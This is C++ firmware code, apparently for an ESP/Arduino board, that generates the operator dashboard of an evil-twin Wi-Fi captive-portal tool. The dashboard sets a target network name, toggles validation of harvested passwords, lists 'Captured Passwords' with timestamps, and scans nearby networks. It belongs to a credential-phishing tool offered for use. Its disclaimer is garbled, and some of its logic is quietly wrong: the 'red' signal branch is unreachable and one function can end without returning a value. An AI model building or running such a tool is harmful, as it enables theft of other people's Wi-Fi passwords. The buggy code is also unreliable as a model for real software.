#include "dashboard.h"

String encryptMode(const int eC){
  if(eC == 2){ return "WPA"; }
  if(eC == 5){ return "WEP"; }
  if(eC == 4){ return "WPA2"; }
  if(eC == 7){ return "None"; }
  if((eC != 2) && (eC != 5) && (eC != 4) && (eC != 7)){ return "????"; }
}

String signalColor(const int strength){
  if(strength >= -70){ return "green"; }
  if(strength <= -70){ return "yellow"; }
  if(strength <= -80){ return "red"; }
}

String dashboard(const String& indexLang, const String& favicon, const String& currentSSID, const String& allPass, const int numNetworks, const bool validation){
  char acColor[8] = "#ff0003"; //defines the color of the accent stripes on the <h1> lines on the dashboard

  String _html;
  _html.reserve(10500);
  _html += "<!DOCTYPE html><html><head>";
  _html += favicon;
  
  _html += "<meta name='viewport' content='initial-scale=1.0, width=device-width'>";
  _html += "<title> Captive Portal Dashboard</title>";
  _html += "<style>";

  _html += "* {";
  _html += "font-family: monospace;";
  _html += "color: #bfbfbb;";
  _html += "margin: 0;";
  _html += "font-size: 17px; }";

  _html += "body { background: #36393e; }";
  
  _html += ".content { max-width: 1000px; margin: auto; }";

  _html += ".button-container {";
  _html += "display: flex;";
  _html += "justify-content: space-between;";
  _html += "align-content: center;";
  _html += "align-items: center;";
  _html += "flex-wrap: nowrap;";
  _html += "flex-direction: row; }";
  
  _html += "table {";
  _html += "border-collapse: collapse;";
  _html += "width: 100%;";
  _html += "min-width: 400px;";
  _html += "margin-bottom: 32px; }";

  _html += "form { display: flex; }";
  
  _html += "th, td {";
  _html += "padding: 10px 6px;";
  _html += "text-align: left;";
  _html += "border-bottom: 1px solid #5d5d5d;";
  _html += "font-size: 17px;";
  _html += "text-align: center; }";
  
  _html += "button, input {";
  _html += "display: inline-block;";
  _html += "height: 42px;";
  _html += "padding: 0px 25px;";
  _html += "text-align: center;";
  _html += "font-size: 13px;";
  _html += "font-weight: 600;";
  _html += "letter-spacing: .16px;";
  _html += "background: #2f3136;";
  _html += "border-radius: 4px;";
  _html += "border: none;";
  _html += "cursor: pointer;";
  _html += "margin-right: 20px; }";

  _html += "input[type=submit], button { text-transform: uppercase; }";

  _html += "select {";
  _html += "font-weight: 600;";
  _html += "padding: 6px 20px;";
  _html += "background-color: #2f3136;";
  _html += "border-radius: 4px;";
  _html += "text-align: center;";
  _html += "border: 0;";
  _html += "margin-right: 20px;";
  _html += "cursor: pointer;";
  _html += "font-size: 13px;";
  _html += "appearance: none; }";

  _html += "button:hover, input:hover, select:hover { background: #42444a; }";
  
  _html += "h1 {";
  _html += "font-size: 32px;";
  _html += "margin: 7px 10px 7px 0px;";
  _html += "background: #2f3136;";
  _html += "padding: 3px 16px;";
  _html += "border-radius: 3px;";
  _html += "border-left: solid ";
  _html += acColor;
  _html += " 8px;";
  _html += "padding-left: 12px; }";

  _html += "h2 {";
  _html += "font-size: 24px;";
  _html += "margin: 18px; }";

  _html += "input[type=number] { -moz-appearance: textfield; }";
  _html += "input::-webkit-outer-spin-button, input::-webkit-inner-spin-button { -webkit-appearance: none; margin: 0; }";

  _html += ".spacer { border: 0; border-top: 1px solid #5d5d5d; }";
  
  _html += "</style></head>";
  
  _html += "<body>";
  _html += "<div class='content'>";
  _html += "<h1 style='padding: 3px 0.1em; text-align: center; font-size: 40px;'>Captive Portal Dashboard</h1>";

  _html += "<p><span style='color: red;'>INFO:<br></span><span style='color: red; font-size: 16px;'>- ! ! ! ONLY FOR EDUCATIONAL USE, USING IT ON DEVICES OR NETWORKS YOU DO HAVE PERMISSION TO  IS ILLEGAL AND WILL GET YOU IN TROUBLE ! ! !<br></span>";
  _html += "<span>- Credits to: Spacehuhn, adamff-dev, sankethj and justcallmekoko their projects helped me understand things and without the knowlege that I have gained form their projects this would probably wouldn't work<br>- Made by HEINZGUENTER</span></p>";

  _html += "<div><h1>Settings</h1><div class='button-container'>";
  _html += "<h2>Language:</h2>";
  _html += "<form action='/language' methode='post'><select name='lang'>";

  if (indexLang == "EN"){ _html += "<option value='DE'>DE</option><option selected value='EN'>EN</option>"; } 
  else { _html += "<option selected value='DE'>DE</option><option value='EN'>EN</option>"; }

  _html += "</select><input type=submit value='Change'></form></div><hr class='spacer'>";

  //SSID part on the website  
  _html += "<div class='button-container'><h2>TargetSSID:</h2>";
  _html += "<form action='/ssid'><input value='"+ currentSSID +"' type=text placeholder='Target SSID' name=ssid required maxlength='32'></input><input type=submit value='Change SSID'></form>";
  _html += "</div><hr class='spacer'>";

  _html += "<div class='button-container'><h2>Password validation:</h2>";
  _html += "<form action='/validate' methode='post'><select name='validate'>";

  //check and display if validation is turned on
  if (validation == true){ _html += "<option selected value='on'>On</option><option value='off'>Off</option>"; } 
  else { _html += "<option value='on'>On</option><option selected value='off'>Off</option>"; }

  _html += "</select><input type='submit' value='Enter'>";
  _html += "</form></div></div>";
  
  _html += "<div><div class='button-container'><h1 style='padding-right: 112px;'>Captured Passwords</h1>";
  _html += "<form style='display:inline-block;' method='post' action='/clearPass'><button style='display:inline-block;'>Delete Passwords</button></form>";
  _html += "<form style='display:inline-block;' method='post' action='/dashboard?led_off'><button style='display:inline-block;'>Disable LED</button></form></div>";
  
  //adds passwords to the table if one or more was entered
  if (allPass != "") {
    _html += "<table style='text-align: center;'><tbody><tr><th>Password</th><th>Seconds after Bootup</th></tr>";
    
    //add passwords from the storage
    _html += allPass;

    _html += "</tbody></table>";
  } else { _html += "<p><b style='margin: 7px 0px 7px 18px;'>No Passwords Captured yet!</b></p>"; }
  _html += "</div>";

  //nearby networks part
  _html += "<div><div class='button-container'>";
  _html += "<h1 style='padding-right: 300px;'>Nearby Networks</h1>";
  _html += "<form style='display:inline-block;' method='post' action='/dashboard'><button style='display:inline-block;'>Scan</button></form></div>";

  _html += "<table><tbody><tr><th>SSID</th><th>Mac Adress</th><th>Channel</th><th>Signal Strength</th><th>Encryption</th></tr>";
  
  for (int i = 0; i < numNetworks; i++) { //adds a table entry for every network
    _html += "<tr><td>" + WiFi.SSID(i) + "</td><td>" + WiFi.BSSIDstr(i) + "</td><td>" + WiFi.channel(i) + "</td><td style='color: " + signalColor(WiFi.RSSI(i)) + ";'>" + WiFi.RSSI(i) + "</td><td>" + encryptMode(WiFi.encryptionType(i)) + "</td></tr>";
  }
  
  _html += "</tbody></table></div></div></body></html>";
  return _html;
}